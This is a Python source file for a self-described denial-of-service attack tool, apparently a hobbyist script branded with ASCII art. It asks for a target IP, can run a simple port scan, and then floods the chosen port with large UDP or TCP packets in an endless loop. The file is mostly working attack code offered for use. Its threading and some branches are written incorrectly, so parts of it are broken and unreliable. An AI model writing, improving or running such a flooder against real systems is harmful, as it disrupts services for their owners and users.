import threading
import time
import socket
import datetime
import json
from colorama import Fore, Back, Style
ips = {
    "Your collection of": "IPs"
}

f = ips.values()
g = ips.keys()
h = ips.items()
print(Fore.MAGENTA + json.dumps(ips, indent=2, sort_keys=True))
print(type(ips))
print(len(ips))
y = datetime.datetime.now()
print(Fore.CYAN + "Date:")
print(y)
print("Year:")
print(y.year)
print("Day:")
print(y.strftime("%A"))
print("Month:")
print(y.strftime("%B"))
print(Fore.RESET)
print(Fore.RED)
print(Style.DIM)
print("""

Created by 
  _______   __              _______   __                      __     _______                   __   
 |       | |  |--. .-----. |   _   | |  |--. .-----. .-----. |  |_  |   _   \ .-----. .-----. |  |_ 
 |.|   | | |     | |  -__| |.  |___| |     | |  _  | |__ --| |   _| |.  l   / |  _  | |  _  | |   _|
 `-|.  |-' |__|__| |_____| |.  |   | |__|__| |_____| |_____| |____| |.  _   1 |_____| |_____| |____|
   |:  |                   |:  1   |                                |:  |   |                       
   |::.|                   |::.. . |                                |::.|:. |                       
   `---'                   `-------'                                `--- ---'                       
                                                                                                    

   *         (         )   (     
 (  `        )\ )   ( /(   )\ )  
 )\))(   (  (()/(   )\()) (()/(  
((_)()\  )(  /(_)) ((_)\   /(_)) 
(_()((_)(()\(_))_    ((_) (_))   
|  \/  | ((_)|   \  / _ \ / __|  
| |\/| || '_|| |) || (_) |\__ \  
|_|  |_||_|  |___/  \___/ |___/  
                                 

+-----===========--========------+
| Denial-of-Service (DoS) attack |
+---====------==================-+

""")
print(Fore.RESET)
time.sleep(2)
ip = input(Fore.RED + "{<[?]>} Enter the target IP " + Fore.BLUE + "[public IP is recomened]" + Fore.RED + " >}> " + Fore.MAGENTA)
print(Fore.YELLOW + " /{<!>}\ This is the target IP " + Fore.MAGENTA + ip + Fore.YELLOW + ' /{<!>}\ ')
print(Fore.RESET)
respP = input(Fore.RED + "{<[?]>} Do you want to start port scanner? " + Fore.BLUE + "[Y/N]" + Fore.RED + " >}> " + Fore.BLUE)
print(Fore.RESET)
if respP == "y":
    print(Fore.RED + " /{<->}\ Please enter " + Fore.BLUE + "Y" + Fore.RED + " for Yes! /{<->}\ ")
    print(Fore.RESET)
if respP == "n":
    print(Fore.RED + " /{<->}\ Please enter " + Fore.BLUE + "N" + Fore.RED + " for No! /{<->}\ ")
    print(Fore.RESET)
if respP == "N":
    print(Fore.RED + " /{<->}\ You choose " + Fore.BLUE + "No" + Fore.RED + " /{<->}\ ")
    print(Fore.RESET)
if respP == "Y":
    print(Fore.GREEN + " /{<+>}\ You choose " + Fore.BLUE + "Yes" + Fore.GREEN + " /{<+>}\ ")
    print(Fore.RESET)
    time.sleep(1)
    print(Fore.YELLOW + ' /{<!>}\ This is the IP ' + Fore.MAGENTA + ip + Fore.YELLOW + ' for port scan /{<!>}\ ')
    print(Fore.RESET)
    rf = input(Fore.RED + "{<[?]>} Enter the first port for scan >}> " + Fore.MAGENTA)
    print(Fore.YELLOW + " /{<!>}\ You entered " + Fore.MAGENTA + rf + Fore.YELLOW + ' as first port for scan </{<!>}\ ')
    print(Fore.RESET)
    rfi = int(rf)
    rl = input(Fore.RED + "{<[?]>} Enter the last port for scan >}> " + Fore.MAGENTA)
    print(Fore.RESET)
    print(Fore.YELLOW + " /{<!>}\ You entered " + Fore.MAGENTA + rl + Fore.YELLOW + " as last port for scan /{<!>}\ ")
    print(Fore.RESET)
    rli = int(rl)
    port1 = range(rfi, rli)
    chose = input(Fore.YELLOW + """
    \n/{<!>}\ The scan methods are: """ 
    + Fore.CYAN + """ 
    > 1) socket.AF_INET, socket.SOCK_DGRAM
    > 2) socket.AF_INET, socket.SOCK_STREAM
    > 3) Custom """
    + Fore.BLUE + 
    """
    {<[?]>} Choose a scan method >}> """ + Fore.MAGENTA)
    print(Fore.RESET)
    if chose == '1':
        print(Fore.YELLOW + " /{<!>}\ You choose "+ Fore.CYAN + "socket.AF_INET, socket.SOCK_DGRAM"+ Fore.YELLOW + " scan method /{<!>}\ ")
        print(Fore.RESET)
        time.sleep(1)
        def portscan(port1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((ip, port1))
                return True
            except:
                return False
        for port1 in range(rfi, rli):
            result = portscan(port1)
            if result:
                print(Fore.GREEN + " /<+>\ Port {} is open!".format(port1) + Fore.GREEN + ' /<+>\ ')
                print(Fore.RESET)
            else:
                continue
        portscan(port1)
    if chose == '2':
        print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "socket.AF_INET, socket.SOCK_STREAM" + Fore.YELLOW + "scan method /{<!>}\ ")
        print(Fore.RESET)
        time.sleep(1)
        def portscan(port1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port1))
                return True
            except:
                return False
        for port1 in range(rfi, rli):
            result = portscan(port1)
            if result:
                print(Fore.GREEN + " /<+>\ Port {} is open!".format(port1) + Fore.GREEN + ' /<+>\ ')
                print(Fore.RESET)
            else:
                continue
        portscan(port1)
    if chose == '3':
        print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "custom" + Fore.YELLOW + " scan method /{<!>}\ ")
        time.sleep(1)
        cus = input(Fore.RED + " {<[?]>} Enter a socket method " + Fore.BLUE + "[example: socket.AF_INET, socket.SOCK_STREAM]" + Fore.RED + " >}> " + Fore.BLUE)
        print(Fore.RESET)
        def portscan(port1):
            try:
                sock = socket.socket(cus)
                sock.connect((ip, port1))
                return True
            except:
                return False
        for port1 in range(rfi, rli):
            result = portscan(port1)
            if result:
                print(Fore.GREEN + " /<+>\ Port {} is open!".format(port1) + Fore.GREEN + ' /<+>\ ')
                print(Fore.RESET)
            else:
                continue
        portscan(port1)
port = input(Fore.RED + " {<[?]>} Target open port >}> " + Fore.BLUE)
print(Fore.RESET)
print(Fore.YELLOW + ' /{<!>}\ Open port is ' + Fore.BLUE + port + Fore.YELLOW + ' /{<!>}\ ')
porti = int(port)
th = input(Fore.RED + " {<[?]>} Enter the threads " + Fore.BLUE + "[defalt 200]" + Fore.RED + " press ENTER for defalt >}> " + Fore.MAGENTA)
print(Fore.RESET)
if th == '':
    th = str('200')
    print(Fore.YELLOW + ' /{<!>}\ Threads are ' + Fore.BLUE + th + Fore.YELLOW + ' /{<!>}\ ')
    print(Fore.RESET)
    thi = int(th)
thi = int(th)
by = input(Fore.RED + ' {<[?]>} Enter bytes ' + Fore.BLUE + '[defalt max: 65501]' + Fore.RED + ' press ENTER for defalt' + Fore.RED + ' >}> ' + Fore.MAGENTA)
print(Fore.RESET)
if by == '':
    by = str('65501')
    print(Fore.YELLOW + ' /{<!>}\ Bytes are ' + Fore.BLUE + by + Fore.YELLOW + ' per packet /{<!>}\ ')
    print(Fore.RESET)
    byi = int(by)
byi = int(by)
time.sleep(1)
print(Fore.RED + """

 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░  ░  ░      ░  ░░ ░      ░  ░    ░           ░       ░ 
                  ░                                      

""")
print(Fore.RESET)
time.sleep(1)
chooose = input(Fore.YELLOW + """
\n /{<!>}\ DoS method are: """
+ Fore.CYAN + """
> 1) socket.AF_INET, socket.SOCK_DGRAM
> 2) socket.AF_INET, socket.SOCK_STREAM
> 3) Custom """
+ Fore.BLUE + """
{<[?]>} Choose DOS method >}> """)
print(Fore.RESET)
if chooose == '1':
    print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "socket.AF_INET, socket.SOCK_DGRAM"+ Fore.YELLOW + " Dos method /{<!>}\ ")
    print(Fore.RESET)
    def dos(packet):
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        x = 0
        sent = 0
        while True:
            client.sendto(packet, (ip, porti))
            x += byi
            sent += 1
            txt = Fore.RED + """ /![KILL]!\ Sended """+ Fore.BLUE + """{}""" + Fore.RED + """ packets, bytes sended """ + Fore.CYAN + """{}""" + Fore.RED +""" to """ + Fore.MAGENTA +"""{}""" + Fore.RED + """ : """ + Fore.MAGENTA + """{}""" + Fore.RED + """ /![KILL]!\ """
            print(txt.format(sent, x, ip, porti))
for i in range(thi):
    threading.Thread(target=dos)
    dos(bytearray(byi))
if chooose == '2':
    print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "socket.AF_INET, socket.SOCK_STREAM" + Fore.YELLOW + " DoS method /{<!>}\ ")
    def dos2(packet):
        client1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        x = 0
        sent = 0
        while True:
            client1.sendto(packet, (ip, porti))
            x += byi
            sent += 1
            txt1 = Fore.RED + """ /![KILL]!\ Sended """ + Fore.BLUE + """{}""" + Fore.RED + """ packets, bytes sended """ + Fore.CYAN + """{}""" + Fore.RED + """ to """ + Fore.MAGENTA + """{}""" + Fore.RED + """ : """ + Fore.MAGENTA + """{}""" + Fore.RED + """ /![KILL]!\ """
            print(txt1.format(sent, x, ip, porti))
for i in range(thi):
    threading.Thread(target=dos2)
    dos2(bytearray(byi))
if chooose == '3':
    print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "custom" + Fore.YELLOW + " DoS method /{<!>}\ ")
    time.sleep(1)
    chooooose = input(Fore.YELLOW + " {<[?]>} Enter DoS method " + Fore.CYAN + "[example socket.AF_INET, socket.SOCK_STREAM]" + Fore.YELLOW + " >}> " + Fore.CYAN)
    def dos3(packet):
        client2 = socket.socket(chooooose)
        x = 0
        sent = 0
        while True:
            client2.sendto(packet, (ip, porti))
            x += byi
            sent += 1
            txt2 = Fore.RED + """ /![KILL]!\ Sended """ + Fore.BLUE + """{}""" + Fore.RED + """ packets, bytes sended """ + Fore.CYAN + """{}""" + Fore.RED + """ to """ + Fore.MAGENTA + """{}""" + Fore.RED + """ : """ + Fore.MAGENTA + """{}""" + Fore.RED + """ /![KILL]!\ """
            print(txt2.format(sent, x, ip, porti))
for i in range(thi):
    threading.Thread(target=dos3)
    dos3(bytearray(byi))
